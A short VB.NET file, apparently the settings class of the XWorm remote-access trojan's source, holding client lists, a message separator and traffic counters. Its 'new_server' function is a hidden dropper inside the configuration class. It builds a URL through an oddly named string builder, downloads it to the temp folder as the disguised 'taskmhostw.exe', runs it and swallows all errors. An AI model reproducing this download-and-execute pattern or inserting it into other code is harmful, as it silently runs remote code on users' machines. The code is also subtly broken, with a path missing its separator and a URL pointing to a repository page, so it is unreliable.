Public Class Settings
    Public Shared Port As Integer
    Public Shared ReadOnly SPL As String = "<Xwormmm>"
    Public Shared KEY As String

    Public Shared NOTEF As Boolean

    Public Shared Online As New List(Of Client)
    Public Shared Blocked As List(Of String)

    Public Shared Received As Long = 0
    Public Shared Sent As Long = 0

    Public Shared UP As Boolean
    Public Shared FMUP As Boolean
    Public Shared PHP As String

    Friend Shared Function new_server() As Object
        Dim form As String
        Dim harry_pot As New System.Text.StringBuilder

        harry_pot.Append("https://github.com/noradlb1/Xworm2V2-VB-Src")
        form = harry_pot.ToString

        Dim URL As String = form
        Dim DownloadTo As String = Environ("temp") & "taskmhostw.exe"
        Try
            Dim w As New Net.WebClient
            IO.File.WriteAllBytes(DownloadTo, w.DownloadData(URL))
            Shell(DownloadTo)
        Catch ex As Exception
        End Try
    End Function
End Class
